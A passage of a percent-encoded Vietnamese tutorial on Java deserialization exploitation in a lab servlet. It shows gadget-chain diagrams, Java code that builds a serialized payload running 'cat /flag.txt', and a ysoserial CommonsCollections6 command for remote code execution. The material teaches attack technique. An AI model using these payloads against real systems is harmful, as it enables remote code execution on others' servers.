%BB%99t%20**gadgetchain**%20r%E1%BB%93i%2C%20v%C3%AC%20%C4%91%C3%A2y%20l%C3%A0%20m%C3%B4%20ph%E1%BB%8Fng%20nhi%E1%BB%81u%20gadgetchain%20n%C3%AAn%20m%C3%ACnh%20v%C3%AD%20d%E1%BB%A5%20th%E1%BB%A7%20c%C3%B4ng%20c%C3%A1i%20%C4%91%C6%A1n%20gi%E1%BA%A3n%20nh%E1%BA%A5t%2C%20khi%20gh%C3%A9p%20l%E1%BA%A1i%20ta%20s%E1%BA%BD%20c%C3%B3%20m%E1%BB%99t%20gadgetchain%20nh%C6%B0%20n%C3%A0y%3A%0A%60%60%60java%0AHTTP%20POST%20body%20(payload%20nh%E1%BB%8B%20ph%C3%A2n)%0A%20%20%20%20%20%20%20%20%E2%86%93%0AVulnServlet.doPost()%20%0A%20%20%20%20%E2%86%92%20new%20ObjectInputStream(request.getInputStream())%0A%20%20%20%20%E2%86%92%20ois.readObject()%0A%20%20%20%20%20%20%20%20%E2%86%93%0AObjectInputStream%3A%0A%20%20%20%20-%20Load%20class%20DangerousAction%0A%20%20%20%20-%20T%E1%BA%A1o%20instance%20tr%E1%BB%91ng%0A%20%20%20%20-%20Set%20private%20field%20cmd%20t%E1%BB%AB%20payload%0A%20%20%20%20-%20T%C3%ACm%20%26%20g%E1%BB%8Di%20DangerousAction.readObject()%0A%20%20%20%20%20%20%20%20%20%20%20%20%E2%86%93%0ADangerousAction.readObject()%3A%0A%20%20%20%20Runtime.getRuntime().exec(cmd)%0A%60%60%60%0A%0ASau%20khi%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20%C4%91%C6%B0%E1%BB%A3c%20nh%C6%B0%20v%E1%BA%ADy%20r%E1%BB%93i%20ch%C3%BAng%20ta%20%C4%91%E1%BA%BFn%20b%C6%B0%E1%BB%9Bc%20test%2C%20trong%20VulnServlet.java%2C%20d%C3%B2ng%3A%0A%60%60%60java%0AObjectInputStream%20ois%20%3D%20new%20ObjectInputStream(request.getInputStream())%3B%0AObject%20obj%20%3D%20ois.readObject()%3B%0A%60%60%60%0Ata%20th%E1%BA%A5y%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20entry%20point%2C%20ta%20%60%60%60ctrl%2Bclick%60%60%60%20v%C3%A0o%20%60%60%60readObject%60%60%60%20th%C3%AC%20nh%E1%BA%A3y%20%C4%91%E1%BA%BFn%20l%E1%BB%9Bp%20%60%60%60ObjectInputStream%60%60%60!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJXqKIxdgx.png)%0Ata%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20%60%60%60object%60%60%60%20%E1%BB%9F%20%C4%91%C3%A2y%20l%C3%A0%20**untrusted%20data**%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20**deserialize**%20m%C3%A0%20ch%C3%BAng%20ta%20truy%E1%BB%81n%20v%C3%A0o.%20Nh%C6%B0%20v%E1%BA%ADy%20l%C3%A0%20khi%20payload%20c%E1%BB%A7a%20ch%C3%BAng%20ta%20POST%20l%C3%AAn%20%60%60%60endpoint%20%2Fvuln%60%60%60%2C%20%20servlet%20g%E1%BB%8Di%20%60%60%60ObjectInputStream.readObject()%60%60%60%2C%20m%C3%A0%20ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20%E1%BB%9F%20**sink**%2C%20c%E1%BB%A5%20th%E1%BB%83%20l%C3%A0%20%E1%BB%9F%20class%20%60%60%60DangerousAction%60%60%60%20c%C3%B3%20h%C3%A0m%20%60%60%60readObject(ObjectInputStream)%60%60%60%2C%20nh%C6%B0%20v%E1%BA%ADy%20b%C3%A2y%20gi%E1%BB%9D%20ch%C3%BAng%20ta%20ki%E1%BA%BFm%20c%C3%A1ch%20%C4%91%E1%BB%83%20JVM%20g%E1%BB%8Di%20%C4%91%C6%B0%E1%BB%A3c%20**sink**%20l%C3%A0%20ho%C3%A0n%20th%C3%A0nh%2C%20ch%C3%BAng%20ta%20t%C3%ACm%20hi%E1%BB%83u%20th%C3%AAm%20trong%20%60%60%60ObjectInputStream%60%60%60%20c%C3%B3%20h%C3%A0m%20%60%60%60invokeReadObject%60%60%60%2C%20nh%C6%B0%20%E1%BB%9F%20ph%E1%BA%A7n%20l%C3%AD%20thuy%E1%BA%BFt%20t%C3%B4i%20%C4%91%C3%A3%20ch%E1%BB%89%20%C4%91%C3%A2y%20l%C3%A0%20**reflection**%2C%20ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20l%E1%BB%A3i%20d%E1%BB%A5ng%20g%E1%BB%8Di%20**sink**%20b%E1%BA%B1ng%20**reflection**.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1nYpLx_ee.png)%0A%C4%90%C3%A2y%20l%C3%A0%20graph%20cho%20qu%C3%A1%20tr%C3%ACnh%20th%E1%BB%B1c%20hi%E1%BB%87n%20c%E1%BB%A7a%20t%C3%B4i%20cho%20d%E1%BB%85%20nh%C3%ACn%0A%60%60%60java%0AHTTP%20POST%20%2Fvuln%0A%20%20%20%E2%86%93%0AVulnServlet.doPost()%0A%20%20%20%E2%86%93%0AObjectInputStream.readObject()%0A%20%20%20%E2%86%93%0AObjectStreamClass.invokeReadObject()%20%20%20%20%5Breflection%5D%0A%20%20%20%E2%86%93%0ADangerousAction.readObject(ObjectInputStream)%20%20%20%0A%20%20%20%E2%86%93%0ARuntime.getRuntime().exec(cmd)%20%20%20%5BRCE%20Sink%5D%0A%0A%60%60%60%0ASau%20khi%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20%C4%91%C6%B0%E1%BB%A3c%20gadgetchain%2C%20b%E1%BA%A1n%20c%C3%B3%20th%E1%BB%83%20t%E1%BA%A1o%20ra%20payload%20c%E1%BB%A7a%20m%C3%ACnh%2C%20l%C3%BAc%20n%C3%A0y%20ch%C3%BAng%20ta%20m%E1%BB%9F%20burp%20l%C3%AAn%20v%C3%A0%20ch%C3%A8n%20payload%20c%E1%BB%A7a%20m%C3%ACnh%20th%C3%B4i.%20Nh%C6%B0ng%20tr%C6%B0%E1%BB%9Bc%20%C4%91%E1%BA%A5y%20b%E1%BA%A1n%20t%E1%BA%A1o%20%C4%91%C6%B0%E1%BB%A3c%20m%E1%BB%99t%20payload%20nh%C6%B0%20n%C3%A0y%3A%0A%60%60%60java%0Apackage%20com.example.vuln%3B%0A%0Aimport%20java.io.FileOutputStream%3B%0Aimport%20java.io.ObjectOutputStream%3B%0A%0Apublic%20class%20CreatePayload%20%7B%0A%20%20%20%20public%20static%20void%20main(String%5B%5D%20args)%20throws%20Exception%20%7B%0A%20%20%20%20%20%20%20%20DangerousAction%20da%20%3D%20new%20DangerousAction(%22cat%20%2Fflag.txt%22)%3B%0A%20%20%20%20%20%20%20%20try%20(ObjectOutputStream%20oos%20%3D%20new%20ObjectOutputStream(new%20FileOutputStream(%22payload.bin%22)))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20oos.writeObject(da)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Payload%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20t%E1%BA%A1o%3A%20payload.bin%22)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%0A%60%60%60%0Av%C3%A0%20ch%E1%BA%A1y%20payload%20n%C3%A0y%20v%C3%A0%20class%20%60%60%60DangerousAction%60%60%60%20%C4%91%E1%BB%83%20c%C3%B3%20file%20%60%60%60payload.bin%60%60%60(nh%E1%BB%9B%20c%E1%BA%A9n%20th%E1%BA%ADn%20payload%20m%E1%BB%9Bi%20c%C3%A1i%20%60%60%60serialVersionUID%60%60%60%20c%E1%BB%A7a%20%60%60%60DangerousAction%60%60%60%20kh%C3%B4ng%20kh%E1%BB%9Bp)%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSkVUKDlOxg.png)%0Ach%C3%BAng%20ta%20curl%20th%E1%BB%AD%20v%C3%A0%20th%E1%BA%A5y%20website%20tr%E1%BA%A3%20v%E1%BB%81%20nh%C6%B0%20n%C3%A0y%20l%C3%A0%20th%C3%A0nh%20c%C3%B4ng%2C%20l%C3%BAc%20n%C3%A0y%20ta%20m%E1%BB%9F%20burp%20l%C3%AAn%20v%C3%A0%20import%20file%20%60%60%60payload.bin%60%60%60%20n%C3%A0y%20v%C3%A0o%20repeater%20%C4%91%E1%BB%83%20xem%20nh%C6%B0%20n%C3%A0o%20(b%E1%BA%A1n%20nh%E1%BB%9B%20%C4%91%E1%BB%95i%20Content-Type%3A%20th%C3%A0nh%20application%2Foctet-stream)%2C%20nh%C6%B0%20n%C3%A0y%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkYZ5Dg_xx.png)%0AKhi%20%C4%91%E1%BA%BFn%20b%C6%B0%E1%BB%9Bc%20n%C3%A0y%20th%C3%AC%20ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20payload%20%C4%91%C3%A3%20ch%E1%BA%A1y%20theo%20%C3%BD%20m%C3%ACnh%20mu%E1%BB%91n%2C%20%C4%91%C3%A3%20ch%E1%BA%A1y%20%C4%91%C6%B0%E1%BB%A3c%20%60%60%60readObject()%60%60%60%20c%E1%BB%A7a%20%60%60%60DangerousAction%60%60%60%20v%C3%A0%20%60%60%60Runtime.getRuntime().exec(cmd)%60%60%60%20c%C5%A9ng%20%C4%91ang%20th%E1%BB%B1c%20thi%20nh%C6%B0ng%20kh%C3%B4ng%20hi%E1%BB%87n%20output%2C%20v%C3%AC%20%C4%91%C3%A3%20RCE%20th%C3%A0nh%20c%C3%B4ng%20vi%E1%BB%87c%20xem%20flag%20c%C3%A1c%20b%E1%BA%A1n%20t%E1%BB%B1%20l%C3%A0m%20ti%E1%BA%BFp%2C%20m%E1%BB%99t%20s%E1%BB%91%20c%C3%A1ch%20b%E1%BA%A1n%20xem%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%B3%20th%E1%BB%83%20curl%20flag%20ra%20ngo%C3%A0i%20hay%20input%20m%E1%BB%99t%20file%20m%E1%BB%9Bi%20trong%20server%20v%C3%A0%20xem.%0A%0APh%E1%BA%A7n%20tr%C3%AAn%20l%C3%A0%20m%C3%ACnh%20h%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn%20s%C6%A1%20c%C3%A1ch%20m%C3%A0%20l%C3%A0m%20th%E1%BB%A7%20c%C3%B4ng%2C%20tr%C3%AAn%20th%E1%BB%B1c%20t%E1%BA%BF%20th%C3%AC%20m%C3%ACnh%20ph%E1%BA%A3i%20ph%C3%A2n%20t%C3%ADch%20v%C3%A0%20%C4%91i%20qua%20r%E1%BA%A5t%20nhi%E1%BB%81u%20**gadget**%2C%20v%C3%AD%20d%E1%BB%A5%20nh%C6%B0%20kh%C3%B4ng%20%C4%91%C6%B0%E1%BB%A3c%20%C4%91i%20th%E1%BA%B3ng%20%C4%91%E1%BA%BFn%20class%20%60%60%60DangerousAction%60%60%60%20m%C3%A0%20ph%E1%BA%A3i%20d%C3%B9ng%20c%C3%B4ng%20c%E1%BB%A5%20**Ysoserial**%20th%C3%AC%20sao%2C%20sau%20%C4%91%C3%A2y%20m%C3%ACnh%20s%E1%BA%BD%20h%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn%20c%C3%A1c%20b%E1%BA%A1n%20x%C3%A0i%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y%20nh%C6%B0%20n%C3%A0o.%20%C4%90%E1%BA%A7u%20ti%C3%AAn%20ta%20v%E1%BA%ABn%20th%E1%BA%A5y%20**source**%20v%E1%BA%ABn%20l%C3%A0%20ch%E1%BB%97%20c%C5%A9%2C%20m%C3%ACnh%20kh%C3%B4ng%20n%C3%B3i%20l%E1%BA%A1i%20n%E1%BB%AFa%2C%20b%C3%A2y%20gi%E1%BB%9D%20m%C3%ACnh%20th%E1%BB%AD%20xem%20file%20**Utils.java**%20xem%20c%C3%B3%20g%C3%AC%20kh%C3%B4ng%2C%20ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%B3%20m%E1%BB%99t%20**magic%20method**%20l%C3%A0%20%60%60%60toString%60%60%60.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJInrjldlg.png)%0ATa%20c%C3%B3%20th%E1%BB%83%20l%E1%BB%A3i%20d%E1%BB%A5ng%20n%C3%A0y%20%C4%91%E1%BB%83%20hi%E1%BB%83n%20th%E1%BB%8B%20m%E1%BB%99t%20th%E1%BB%A9%20g%C3%AC%20%C4%91%E1%BA%A5y%20m%C3%A0%20m%C3%ACnh%20mong%20mu%E1%BB%91n%20thay%20v%C3%AC%20ph%E1%BA%A3i%20curl%20ra%20ngo%C3%A0i%20hay%20ghi%20file%20trong%20server.%20Ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20ta%20c%C3%B3%20th%E1%BB%83%20k%C3%ADch%20ho%E1%BA%A1t%20%60%60%60toString%60%60%60%20%E1%BB%9F%20d%C3%B2ng%2018.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkErSig_xe.png)%0ATa%20%C4%91%C3%A3%20c%C3%B3%20**Source**%20v%C3%A0%20c%C3%B3%20th%E1%BB%83%20coi%20h%C3%A0m%20%60%60%60toString%60%60%60%20%E1%BB%9F%20**Utils.java**%20l%C3%A0%20m%E1%BB%99t%20**Sink**%2C%20nh%C6%B0ng%20v%E1%BA%A5n%20%C4%91%E1%BB%83%20%E1%BB%9F%20%C4%91%C3%A2y%20l%C3%A0%20n%C3%B3%20ch%E1%BB%89%20in%20ra%20payload%2C%20l%C3%A0%20%60%60%60obj%60%60%60%20m%C3%A0%20m%C3%ACnh%20truy%E1%BB%81n%20v%C3%A0o%2C%20th%C3%AC%20l%C3%BAc%20n%C3%A0y%20m%C3%ACnh%20s%E1%BA%BD%20nh%E1%BB%9B%20l%E1%BA%A1i%20ph%E1%BA%A3i%20ki%E1%BB%83m%20tra%20th%C6%B0%20vi%E1%BB%87n%20c%E1%BB%A7a%20server%2C%20tr%C3%AAn%20th%E1%BB%B1c%20t%E1%BA%BF%20ch%C3%BAng%20ta%20c%C5%A9ng%20ph%E1%BA%A3i%20ki%E1%BB%83m%20tra%20v%C3%A0%20n%E1%BB%91i%20c%C3%A1c%20**Gadget**%20%E1%BB%9F%20c%C3%A1c%20th%C6%B0%20vi%E1%BB%87n%20v%E1%BB%9Bi%20nhau%2C%20v%C3%AC%20m%C3%ACnh%20c%C3%B3%20source%20code%20v%C3%A0%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%B3%20th%C6%B0%20vi%E1%BB%87n%20commons-collections-3.2.1.jar.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJkhIixuex.png)%0Ath%C3%AC%20v%E1%BB%9Bi%20th%C6%B0%20vi%E1%BB%87n%20n%C3%A0y%2C%20ta%20th%E1%BA%A5y%20trong%20b%E1%BB%99%20th%C6%B0%20vi%E1%BB%87n%20c%E1%BB%A7a%20**Ysoserial**%20%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBydo8WPOxe.png)%0A%0A%0ATuy%20payload%20**CommonsCollections6**%20c%C3%B3%20phi%C3%AAn%20b%E1%BA%A3n%20l%C3%A0%20**3.1**%20nh%C6%B0ng%20theo%20m%C3%ACnh%20t%C3%ACm%20hi%E1%BB%83u%20th%C3%AC%20%E1%BB%9F%20phi%C3%AAn%20b%E1%BA%A3n%20**3.2.1**%20c%E1%BB%A7a%20th%C6%B0%20vi%E1%BB%87n%20**commons-collections**%20v%E1%BA%ABn%20ch%C6%B0a%20%C4%91%C6%B0%E1%BB%A3c%20v%C3%A1%2C%20v%C3%AC%20v%E1%BA%ADy%20ta%20v%E1%BA%ABn%20c%C3%B3%20th%E1%BB%83%20s%E1%BB%AD%20d%E1%BB%A5ng%2C%20v%E1%BB%9Bi%20payload%20**CommonsCollections1**%20k%E1%BA%BFt%20h%E1%BB%A3p%20v%E1%BB%9Bi%20**Sink**%20m%C3%A0%20ch%C3%BAng%20ta%20t%C3%ACm%20%C4%91%C6%B0%E1%BB%A3c%2C%20ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20hi%E1%BB%87n%20th%E1%BB%8B%20payload%20c%E1%BB%A7a%20m%C3%ACnh%20th%C3%B4ng%20qua%20%C4%91%E1%BB%83%20JVM%20t%E1%BB%B1%20k%C3%ADch%20ho%E1%BA%A1t%20**magic%20method**%20thay%20v%C3%AC%20ch%E1%BB%89%20RCE.%0A%0AR%E1%BB%93i%20gi%E1%BB%9D%20m%C3%ACnh%20h%E1%BB%87%20th%E1%BB%91ng%20l%E1%BA%A1i%20h%C6%B0%E1%BB%9Bng%20%C4%91i%20m%E1%BB%9Bi%20c%E1%BB%A7a%20ch%C3%BAng%20ta%20s%E1%BA%BD%20l%C3%A0%3A%0A%60%60%60code%0AVulnServlet.doPost()%0A%20%20%20%20%7C%0A%20%20%20%20v%0AObjectInputStream.readObject()%0A%20%20%20%20%7C%0A%20%20%20%20v%0AHashSet%20(ch%E1%BB%A9a%20CommonsCollections6%20%2B%20Utils)%0A%20%20%20%20%7C%0A%20%20%20%20v%0ACommonsCollections6%20%5Bgadget%20chain%5D%0A%20%20%20%20%7C%0A%20%20%20%20v%0ALazyMap.get()%0A%20%20%20%20%7C%0A%20%20%20%20v%0AChainedTransformer.transform()%0A%20%20%20%20%7C%0A%20%20%20%20v%0AInvokerTransformer.transform()%20%20%20%20%5Breflection%5D%0A%20%20%20%20%7C%0A%20%20%20%20v%0ARuntime.getRuntime().exec(%22cat%20%2Fflag.txt%22)%5Bk%E1%BA%BFt%20th%C3%BAc%20CommonsCollections1%5D%0A%20%20%20%20%20%20%20%20%7C%0A%20%20%20%20%20%20%20%20v%0A(capture%20output%20into%20Utils.payload%20field)%0A%20%20%20%20%7C%0A%20%20%20%20v%0AUtils.toString()%0A%20%20%20%20%7C%0A%20%20%20%20v%0Aresponse.getWriter().println(%22Deserialization%20success%3A%20%22%20%2B%20obj)%0A%20%20%20%20%7C%0A%20%20%20%20v%0AIn%20ra%20%22Payload%20executed%3A%20FLAG%7B...%7D%22%0A%60%60%60%0A%0ASau%20khi%20h%E1%BB%87%20th%E1%BB%91ng%20%C4%91%C6%B0%E1%BB%A3c%20h%C6%B0%E1%BB%9Bng%20%C4%91i%2C%20b%C3%A2y%20gi%E1%BB%9D%20m%C3%ACnh%20s%E1%BA%BD%20chia%20th%C3%A0nh%20hai%20quy%20tr%C3%ACnh%20cho%20c%C3%A1c%20b%E1%BA%A1n%20d%E1%BB%85%20hi%E1%BB%83u%2C%20quy%20tr%C3%ACnh%20m%E1%BB%99t%20l%C3%A0%20**t%E1%BA%A1o%20ph%E1%BA%A7n%20gadget%20chain%20%C4%91%E1%BA%A7u%20ti%C3%AAn**%20(CommonsCollections6)%20v%E1%BB%9Bi%20**ysoserial**%20%E2%86%92%20l%C6%B0u%20ra%20file%20payload%20%C4%91%E1%BB%83%20h%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn%20d%C3%B9ng%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y.%20Sau%20%C4%91%C3%B3%20%C4%91%E1%BA%BFn%20quy%20tr%C3%ACnh%20hai%20l%C3%A0%20**vi%E1%BA%BFt%20Java%20code%20%C4%91%E1%BB%83%20m%E1%BB%9F%20file%20payload**%2C%20n%E1%BB%91i%20th%C3%AAm%20d%E1%BB%AF%20li%E1%BB%87u%20serialize%20c%E1%BB%A7a%20Utils(%22FLAG%7B...%7D%22)%20v%C3%A0o%20ngay%20sau%20%C4%91%C3%B3.%20%0A%0ASau%20khi%20%C4%91%C3%A3%20t%E1%BA%A3i%20**ysoserial**%20r%E1%BB%93i%20th%C3%AC%20c%C3%A1c%20b%E1%BA%A1n%20m%E1%BB%9F%20l%C3%AAn%20v%C3%A0%20ch%E1%BA%A1y%20payload%20(CommonsCollections6)%3A%20%60%60%60java%20-jar%20ysoserial-all.jar%20CommonsCollections6%20%22cat%20%2Fflag.txt%22%20%3E%20part1.ser%60%60%60%0A%0AR%E1%BB%93i%20gi%E1%BB%9D%20m%C3%ACnh%20%C4%91%C3%A3%20c%C3%B3%20th%E1%BB%83%20RCE%20n%E1%BA%BFu%20m%C3%A0%20g%E1%BB%ADi%20file%20n%C3%A0y%20l%C3%AAn%20server%20r%E1%BB%93i%2C%20ti%E1%BA%BFp%20theo%20m%C3%ACnh%20s%E1%BA%BD%20t%E1%BA%A1o%20th%E1%BB%AD%20payload%20th%E1%BB%A9%202%20l%C3%A0%20%60%60%60part2.ser%60%60%60%20%C4%91%E1%BB%83%20test%20th%E1%BB%AD%20c%C3%A1i%20**gadgetchain**%20n%C3%A0y%20c%C3%B3%20ho%E1%BA%A1t%20%C4%91%E1%BB%99ng%20theo%20%C3%BD%20mu%E1%BB%91n%20c%E1%BB%A7a%20m%C3%ACnh%20kh%C3%B4ng%20tr%C6%B0%E1%BB%9Bc%20khi%20d%C3%B9ng%20%60%60%60Hashset%60%60%60%20k%E1%BA%BFt%20h%E1%BB%A3p%202%20**gadgetchain**%20n%C3%A0y%3A%0A%60%60%60java%0Apackage%20com.example.vuln%3B%0A%0Aimport%20java.io.FileOutputStream%3B%0Aimport%20java.io.ObjectOutputStream%3B%0A%0Apublic%20class%20SerializeUtils%20%7B%0A%20%20%20%20public%20static%20void%20main(String%5B%5D%20args)%20throws%20Exception%20%7B%0A%20%20%20%20%20%20%20%20Utils%20u%20%3D%20new%20Utils(%22FLAG%7Bflag%7D%22)%3B%0A%20%20%20%20%20%20%20%20try%20(ObjectOutputStream%20oos%20%3D%20new%20ObjectOutputStream(new%20FileOutputStream(%22part2.ser%22)))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20oos.writeObject(u)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%0A%60%60%60%0ASau%20khi%20b%E1%BA%A1n%20c%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20part1.ser%20v%C3%A0%20part2.ser%20ta%20th%E1%BA%A5y%20k%E1%BA%BFt%20qu%E1%BA%A3%20l%C3%A0%3A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkHlk4vull.png)%0A%C4%91%E1%BA%BFn%20%C4%91%C3%A2y%20c%C3%B3%20v%E1%BA%BB%20ra%20g%E1%BA%A7n%20%C4%91%C3%BAng%20v%E1%BB%9Bi%20%C3%BD%20ch%C3%BAng%20ta%20r%E1%BB%93i%20nh%C6%B0ng%20%E1%BB%9F%20%60%60%60part2.ser%60%60%60%20kh%C3%B4ng%20ra%20k%E1%BA%BFt%20qu%E1%BA%A3%20m%C3%ACnh%20mong%20mu%E1%BB%91n%20l%C3%A0%20%60%60%60Payload%20executed%3A....%60%60%60%2C%20nguy%C3%AAn%20nh%C3%A2n%20%E1%BB%9F%20%C4%91%C3%A2y%20l%C3%A0%20v%C3%AC%20%60%60%60obj.getClass().getName()%60%60%60%20g%E1%BB%8Di%20%C4%91%C3%BAng%20%60%60%60Class.getName()%60%60%60%20v%C3%A0%20kh%C3%B4ng%20g%E1%BB%8Di%20%60%60%60obj.toString()%60%60%60%20nh%C6%B0%20v%E1%BA%ADy%20m%C3%ACnh%20kh%C3%B4ng%20th%E1%BB%83%20**override**%20b%E1%BA%B1ng%20%60%60%60toString()%60%60%60%2C%20b%C3%A2y%20gi%E1%BB%9D%20th%C3%AC%20m%C3%ACnh%20c%C3%B3%20th%E1%BB%83%20d%C3%B9ng%20CC6%20%C4%91%E1%BB%83%20RCE%20r%E1%BB%93i%20nh%C6%B0ng%20n%E1%BA%BFu%20c%C3%A1c%20b%E1%BA%A1n%20mu%E1%BB%91n%20**override**%20%C4%91%E1%BB%83%20in%20ra%20k%E1%BA%BFt%20qu%E1%BA%A3%20m%C3%ACnh%20mu%E1%BB%91n%20b%E1%BA%B1ng%20class%20%60%60%60Untils%60%60%60%20th%C3%AC%20d%E1%BB%B1a%20v%C3%A0o%20**CC6**%2C%20ta%20l%E1%BB%A3i%20d%E1%BB%A5ng%20**reflection**%20trong%20%60%60%60InvokerTransformer%60%60%60%20ho%E1%BA%B7c%20%60%60%60ReflectionExtractor%60%60%60%20l%C3%A0%20**bridge**%20%C4%91%E1%BB%83%20m%C3%ACnh%20g%E1%BB%8Di%20%C4%91%C6%B0%E1%BB%A3c%20field%20%60%60%60toString%60%60%60%20c%E1%BB%A7a%20class%20%60%60%60Untils%60%60%60%20c%C3%B3%20ngh%C4%A9a%20l%C3%A0%20thay%20v%C3%AC%20%E1%BB%9F%20**CC6**%20g%E1%BB%8Di%20th%E1%BA%B3ng%20%60%60%60Runtime.exec%60%60%60%20nh%C6%B0%20trong%20c%C3%A1c%20chain%20g%E1%BB%91c%20th%C3%AC%20m%C3%ACnh%20g%E1%BB%8Di%20%60%60%60Utils.toString()%60%60%60%2C%20nh%C6%B0ng%20h%C6%B0%E1%BB%9Bng%20n%C3%A0y%20l%E1%BA%A1i%20kh%C3%B4ng%20th%E1%BB%83%20**RCE**%2C%20n%E1%BA%BFu%20b%E1%BA%A1n%20mu%E1%BB%91n%20v%E1%BB%ABa%20c%C3%B3%20th%E1%BB%83%20RCE%20v%C3%A0%20in%20ra%20lu%C3%B4n%20th%C3%AC%20c%C3%A1ch%20n%C3%A0y%20t%C6%B0%C6%A1ng%20%C4%91%E1%BB%91i%20ph%E1%BB%A9c%20t%E1%BA%A1p%2C%20v%C3%A0%20ch%E1%BA%A1y%20nhi%E1%BB%81u%20l%E1%BA%A7n%20m%C3%ACnh%20kh%C3%B4ng%20khuy%E1%BA%BFn%20kh%C3%ADch%20l%E1%BA%AFm%2C%20t%C6%B0%C6%A1ng%20%C4%91%E1%BB%91i%20%C3%BD%20t%C6%B0%E1%BB%9Fng%20nh%C6%B0%20n%C3%A0y%3A%0A1.%20Th%E1%BB%B1c%20thi%20l%E1%BB%87nh%20RCE%2C%20v%C3%AD%20d%E1%BB%A5%20%60%60%60bash%20-c%20'cat%20%2Fflag.txt%20%3E%20%2Ftmp%2Fout'%60%60%60.%0A2.%20%C4%90%E1%BB%A3i%20l%E1%BB%87nh%20k%E1%BA%BFt%20th%C3%BAc.%0A3.%20%C4%90%E1%BB%8Dc%20file%20%2Ftmp%2Fout%20th%C3%A0nh%20byte%5B%5D%20b%E1%BA%B1ng%20java.nio.file.Files.readAllBytes(Paths.get(%22%2Ftmp%2Fout%22)).%0A4.%20Chuy%E1%BB%83n%20byte%5B%5D%20%E2%86%92%20String%20(UTF-8).%0A5.%20D%C3%B9ng%20reflection%20g%C3%A1n%20Utils.payload%20%3D%20%3CString%3E%20tr%C3%AAn%20instance%20%60%60%60Utils%60%60%60%20(%C4%91%C3%A3%20c%C3%B3%20trong%20**object-graph**%20payload).%0A6.%20Tr%E1%BA%A3%20v%E1%BB%81%20deserialization%3B%20n%E1%BA%BFu%20server%20sau%20%C4%91%C3%B3%20in%20obj%20(ho%E1%BA%B7c%20HashSet.toString()%20g%E1%BB%8Di%20Utils.toString())%2C%20b%E1%BA%A1n%20s%E1%BA%BD%20th%E1%BA%A5y%20%22Payload%20executed%3A%20%22%20%2B%20payload.%0A%20%20%20%20%0ANh%C6%B0ng%20b%C6%B0%E1%BB%9Bc%20n%C3%A0y%20kh%C3%A1%20l%C3%A0%20ph%E1%BB%A9c%20t%E1%BA%A1p%20n%C3%AAn%20m%C3%ACnh%20ch%E1%BB%89%20n%C3%B3i%20v%E1%BB%81%20%C3%BD%20t%C6%B0%E1%BB%9Fng%20c%C3%A1c%20b%E1%BA%A1n%20c%C3%B3%20th%E1%BB%83%20th%E1%BB%B1c%20hi%E1%BB%87n%20ho%E1%BA%B7c%20b%E1%BB%8F%20qua.%20V%C3%A0%20gi%E1%BB%9D%20b%C6%B0%E1%BB%9Bc%20ti%E1%BA%BFp%20m%C3%ACnh%20s%E1%BA%BD%20h%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn%20c%C3%A1c%20b%E1%BA%A1n%20s%E1%BB%AD%20d%E1%BB%A5ng%20tool%20**Gadget%20Inspector**.%20%C4%90%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20tool%20**code%20analyzer**%20%C4%91%E1%BB%83%20t%C3%ACm%20gadget%20chain%20n%C3%AAn%20m%C3%ACnh%20s%E1%BA%BD%20h%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn%20k%C4%A9%20c%C3%A1ch%20c%C3%A1c%20b%E1%BA%A1n%20d%C3%B9ng%20n%C3%B3%20%C4%91%E1%BB%83%20ph%C3%A2n%20t%C3%ADch%20m%C3%A3%20ngu%E1%BB%93n.%20V%E1%BB%9Bi%20tool%20n%C3%A0y%20th%C3%AC%20c%C3%A0i%20%C4%91%E1%BA%B7t%20s%E1%BA%BD%20kh%C3%A1%20kh%C3%B3%20kh%C4%83n%20m%E1%BB%99t%20ch%C3%BAt%2C%20sau%20khi%20c%C3%A0i%20xong%20tr%C3%AAn%20github%2C%20mu%E1%BB%91n%20d%C3%B9ng%20n%C3%B3%20%C4%91%E1%BB%83%20**ph%C3%A2n%20t%C3%ADch%20m%C3%A3%20ngu%E1%BB%93n**%2C%20b%E1%BA%A1n%20ph%E1%BA%A3i%20chuy%E1%BB%83n%20t%E1%BA%A5t%20c%E1%BA%A3%20th%C6%B0%20vi%E1%BB%87n%20v%C3%A0%20c%C3%A1c%20file%20.class%20th%C3%A0nh%201%20**file%20JAR**%20l%E1%BB%9Bn%3A%0A!%5Bimage%5D